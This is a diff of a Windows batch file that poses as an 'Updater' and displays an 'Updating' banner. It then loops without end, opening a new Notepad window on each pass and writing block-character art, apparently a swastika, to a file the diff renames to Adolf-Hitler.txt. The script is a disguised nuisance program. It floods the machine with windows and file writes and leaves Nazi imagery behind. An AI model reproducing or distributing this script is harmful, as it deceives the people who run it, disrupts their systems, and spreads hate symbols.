@@ -1,4 +1,4 @@
-::Updater
+REM Updater
 echo ---------------------------------------------------------------------------
 echo                                  Updating
 echo.
@@ -9,10 +9,9 @@ echo.
 echo ---------------------------------------------------------------------------
 echo.
 
-timeout 2 > NUL
 cls
 
-::Loops
+REM Loops
 
 :Notepad
 	start "" notepad.exe
@@ -20,16 +19,16 @@ cls
 
 :Hitler  
 	echo.
-	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > prank.txt
-	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> prank.txt
-	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> prank.txt
-	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> prank.txt
-	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> prank.txt
-  	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> prank.txt
-  	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> prank.txt
-  	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> prank.txt
-  	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> prank.txt
-  	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> prank.txt
-  	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> prank.txt
-  	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> prank.txt
+	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > Adolf-Hitler.txt
+	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> Adolf-Hitler.txt
+	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> Adolf-Hitler.txt
+	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> Adolf-Hitler.txt
+	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> Adolf-Hitler.txt
+  	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> Adolf-Hitler.txt
+  	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> Adolf-Hitler.txt
+  	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> Adolf-Hitler.txt
+  	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> Adolf-Hitler.txt
+  	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> Adolf-Hitler.txt
+  	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> Adolf-Hitler.txt
+  	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> Adolf-Hitler.txt
 	goto :Notepad
